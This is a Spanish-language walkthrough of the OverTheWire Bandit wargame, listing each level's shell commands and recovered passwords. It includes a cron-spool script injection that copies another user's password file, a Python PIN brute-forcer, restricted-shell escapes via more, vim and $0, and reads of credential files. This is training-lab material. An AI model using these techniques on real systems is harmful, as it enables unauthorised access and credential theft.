# Overthewire

Notas de http://overthewire.org/wargames/bandit/

Url:
http://overthewire.org/wargames/bandit/bandit0.html

Acceso:
ssh -p 2220 bandit13@bandit.labs.overthewire.org

---


## Level 0
```bash
bandit0@bandit:~$ cat readme
boJ9jbbUNNfktd78OOpsqOltutMc3MY1
```

---


## Level 1
```bash
# ...
CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
bandit1@bandit:~$ find . -type f -exec cat {} \;
```

---

## Level 2
```bash
bandit2@bandit:~$ cat spaces\ in\ this\ filename
UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
```

---

## Level 3
```bash
bandit3@bandit:~$ cat inhere/.hidden
pIwrPrtPN36QITSp3EQaw936yaFoFgAB
```

---

## Level 4
```bash
bandit4@bandit:~$ find . -type f -exec file {} \;
./inhere/-file09: data
./inhere/-file06: data
./inhere/-file01: data
./inhere/-file02: data
./inhere/-file05: data
./inhere/-file03: data
./inhere/-file08: data
./inhere/-file07: ASCII text
./inhere/-file04: data
./inhere/-file00: data
./.bash_logout: ASCII text
./.profile: ASCII text
./.bashrc: ASCII text
bandit4@bandit:~$ cat './inhere/-file07'
koReBOKuIDDepwhWk7jZC0RTdopnAYKh
```

---

## Level 5
```bash
bandit5@bandit:~/inhere$ find . -type f -size 1033c ! -executable -exec file {} +
./maybehere07/.file2: ASCII text, with very long lines
bandit5@bandit:~/inhere$ cat './maybehere07/.file2'
DXjZPULLxYr17uwoI01bNLQbtFemEgo7
```

---

## Level 6
```bash
bandit6@bandit:~$ find / -type f ! -executable -user bandit7 -group bandit6 -size 33c 2>/dev/null
/var/lib/dpkg/info/bandit7.password
bandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password
HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
```

---

## Level 7
```bash
bandit7@bandit:~$ grep millionth data.txt
millionth       cvX2JJa4CFALtqS87jk27qwqGhBM9plV
```
---

## Level 8
```bash
bandit8@bandit:~$ cat data.txt | sort | uniq -c | sort | tail -n 3
     10 yXGLvp7UaeiDKxLGXQYlWuRWdIgeCaT0
     10 YzZX7E35vOa6IQ9SRUGdlEpyaiyjvWXE
      1 UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
```

## Level 9
```bash
bandit9@bandit:~$ strings data.txt | grep '^='
========== password
========== isa
=FQ?P\U
=       F[
=)$=
========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk

```
---

## Level 10
```bash
bandit10@bandit:~$ cat data.txt | base64 -d
The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
```
## Level 11
```bash
bandit11@bandit:~$ cat data.txt | tr '[A-Z][a-z]' '[N-ZA-M][n-za-m]'
The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
```
---

## Level 12
```bash
bandit12@bandit:/tmp/thisisit$ xxd -r data.txt > this
bandit12@bandit:/tmp/thisisit$ file this
this: gzip compressed data, was "data2.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
bandit12@bandit:/tmp/thisisit$ mv this this.gz
bandit12@bandit:/tmp/thisisit$ gunzip this.gz
bandit12@bandit:/tmp/thisisit$ file this
this: bzip2 compressed data, block size = 900k
bandit12@bandit:/tmp/thisisit$ bzip2 -d this
bzip2: Cant guess original name for this -- using this.out
bandit12@bandit:/tmp/thisisit$ file this.out
this.out: gzip compressed data, was "data4.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
bandit12@bandit:/tmp/thisisit$ mv this.out this.gz
bandit12@bandit:/tmp/thisisit$ gunzip this.gz
bandit12@bandit:/tmp/thisisit$ file this
this: POSIX tar archive (GNU)
bandit12@bandit:/tmp/thisisit$ tar xvf this
data5.bin
bandit12@bandit:/tmp/thisisit$ file data5.bin
data5.bin: POSIX tar archive (GNU)
bandit12@bandit:/tmp/thisisit$ mv data5.bin data5.bin.gz
bandit12@bandit:/tmp/thisisit$ mv data5.bin.gz data5.bin
bandit12@bandit:/tmp/thisisit$ file data5.bin
data5.bin: POSIX tar archive (GNU)
bandit12@bandit:/tmp/thisisit$ tar xvf data5.bin
data6.bin
bandit12@bandit:/tmp/thisisit$ file data6.bin
data6.bin: bzip2 compressed data, block size = 900k
bandit12@bandit:/tmp/thisisit$ bzip2 data6.bin
bandit12@bandit:/tmp/thisisit$ bzip2 -d data6.bin.bz2
bandit12@bandit:/tmp/thisisit$ bzip2 -d data6.bin
bzip2: Cant guess original name for data6.bin -- using data6.bin.out
bandit12@bandit:/tmp/thisisit$ file data6.bin.out
data6.bin.out: POSIX tar archive (GNU)
bandit12@bandit:/tmp/thisisit$ tar xvf data6.bin.out
data8.bin
bandit12@bandit:/tmp/thisisit$ file data8.bin
data8.bin: gzip compressed data, was "data9.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
bandit12@bandit:/tmp/thisisit$ mv data8.bin data8.bin.zip
bandit12@bandit:/tmp/thisisit$ mv data8.bin.zip data8.bin.gz
bandit12@bandit:/tmp/thisisit$ gunzip data8.bin.gz
bandit12@bandit:/tmp/thisisit$ file data8.bin
data8.bin: ASCII text
bandit12@bandit:/tmp/thisisit$ cat data8.bin
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
```
---

## Level 13
```bash
bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost 'cat /etc/bandit_pass/bandit14'
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
```
## Level 14
```bash
bandit14@bandit:~$ echo 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e | netcat localhost 30000
Correct!
BfMYroe26WYalil77FoDi9qh59eK5xNr
```
## Level 15
```bash
bandit15@bandit:~$ echo BfMYroe26WYalil77FoDi9qh59eK5xNr | openssl s_client -ign_eof -connect localhost:30001
# ... stripped
---

Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd

closed

```
---

## Level 16
```bash
bandit16@bandit:~$ nmap --script ssl-cert -p 31000-32000 localhost
bandit16@bandit:~$ echo cluFn7wTiGryunymYOu4RcffSxQluehd | openssl s_client -ign_eof -connect localhost:31790
# obtendremos una ssh private key de la respuesta https
bandit16@bandit:/tmp/darker$ ssh -i private bandit17@localhost
```
## Level 17
```bash
bandit17@bandit:~$ diff passwords.old  passwords.new
42c42
< hlbSBPAWJmL6WFDb06gpTx1pPButblOA
---

> kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
```
## Level 18
```bash
~/Dropbox/wiki $ ssh -p 2220 bandit18@bandit.labs.overthewire.org 'cat ~/readme'
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit18@bandit.labs.overthewire.org's password:
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
```
---

## Level 19
```bash
bandit19@bandit:~$ ./bandit20-do id
uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)
bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
```
---

## Level 20
```bash
bandit20@bandit:~$ echo GbKksEFF4yrVs6il55v6gwY5aVje5f0j | nc -l -p 60000 &
[4] 32273
bandit20@bandit:~$ ,^C
bandit20@bandit:~$ ./suconnect 60000
Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
Password matches, sending next password
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
```
## Level 21
```bash
bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
```
---

## Level 22
```bash
bandit22@bandit:~$ more /etc/cron.d/cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
bandit22@bandit:~$ more /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
bandit22@bandit:~$ export mytarget=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
bandit22@bandit:~$ cat  /tmp/$mytarget
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
```
---

## Level 23
```bash
bandit23@bandit:/tmp/yapz$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        timeout -s 9 60 ./$i
        rm -f ./$i
    fi
done


bandit23@bandit:/tmp/yapz$ cat script
#!/bin/bash
mkdir /tmp/yapz2
cat /etc/bandit_pass/bandit24 > /tmp/yapz2/bandit24.txt
chmod 777 /tmp/yapz2/bandit24.txt

bandit23@bandit:/tmp/yapz$ cat /tmp/yapz2/bandit24.txt
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```
---

## Level 24

El python script
```python
#!/usr/bin/env python3
# coding: utf-8
import sys
import socket
pincode = 0
password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
try:
    # Connect to server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 30002))

    # Print welcome message
    welcome_msg = s.recv(2048)
    print(welcome_msg)
    # Try brute-forcing
    while pincode < 10000:
        pincode_string = str(pincode).zfill(4)
        message=password+" "+pincode_string+"\n"
        # Send message
        s.sendall(message.encode())
        receive_msg = s.recv(1024)
        # Check result
        if "Wrong" in receive_msg:
            print("Wrong PINCODE: %s" % pincode_string)
        else:
            print(receive_msg)
            break
        pincode += 1
finally:
    sys.exit(1)
```

Brute forcing!
```bash
# ...
Wrong PINCODE: 8526
Wrong PINCODE: 8527
Wrong PINCODE: 8528
Wrong PINCODE: 8529
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.

bandit24@bandit:/tmp/yapz3$
```

---

## Level 25
Luego de conectarse por SSH este ejecutará una shell la cual es `/usr/bin/showtext` el cual es un simple bash script y al achicar el screen luego de la conección este hara un `more` como paginación por ser un pequeño screen y al estar ahí presionamos `v` el cual es entrar en modo edición y desde ahí ya podremos editar/visualizar cualquier otro archivo en el sistema como `/etc/bandit_pass/bandit26` :)

Tambien podemos obtener una shell desde vim con `:set shell=/bin/bash` y luego `:shell`

5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z

## Level 26
```bash
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
3ba3118a22e93127a4ed485be72ef5ea
```
## Level 27
```bash
bandit27@bandit:/tmp/yapz4/here$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo here
bandit27@bandit:/tmp/yapz4/here$ cat README
The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2
```
---

## Level 28
```bash
bandit28@bandit:/tmp/yapz5/here$ git clone  ssh://bandit28-git@localhost/home/bandit28-git/repo here
bandit28@bandit:/tmp/yapz5/here$ git log -p README.md | grep password
-- password: bbc96594b4e001778eee9975372716b2
+- password: xxxxxxxxxx
-- password: <TBD>
+- password: bbc96594b4e001778eee9975372716b2
+- password: <TBD>

```
## Level 29
```bash
bandit29@bandit:/tmp/yapz6/here$ git clone ssh://bandit29-git@localhost/home/bandit29-git/repo here
bandit29@bandit:/tmp/yapz6/here$ git checkout origin/dev

bandit29@bandit:/tmp/yapz6/here$ cat README.md
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: 5b90576bedb2cc04c86a9e924ce42faf
```
---

## Level 30
```bash
bandit30@bandit:/tmp/yapz7/here$ git tag
secret
bandit30@bandit:/tmp/yapz7/here$ git show secret
47e603bb428404d265f59c42920d81e5
```
---

## Level 31
```bash
    5  git clone ssh://bandit31-git@localhost/home/bandit31-git/repo
   11  cat .gitignore
   34  git add -Af .
   35  git commit -m "Enabling txt again"
   36  git push origin master

bandit31@bandit:/tmp/yapz8/repo$ git push origin master
#...
remote:
remote: Well done! Here is the password for the next level:
remote: 56a9bf19c63d650ce78e6ec0354ee45e
remote:
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote:
remote:
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote:
remote: Wrong!
remote:
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote:
To ssh://localhost/home/bandit31-git/repo
 ! [remote rejected] master -> master (pre-receive hook declined)
error: failed to push some refs to 'ssh://bandit31-git@localhost/home/bandit31-git/repo'

```
---

## Level 32
```bash
WELCOME TO THE UPPERCASE SHELL
>> HELP
sh: 1: HELP: not found
>> $0
$ pwd
/home/bandit32
$ ls -la *
-rwsr-x--- 1 bandit33 bandit32 7556 Oct 16  2018 uppershell
$ cat /etc/bandit_pass/bandit33
c9c3199ddf4121b10cf581a98d51caee
```
## Level 33
THE END
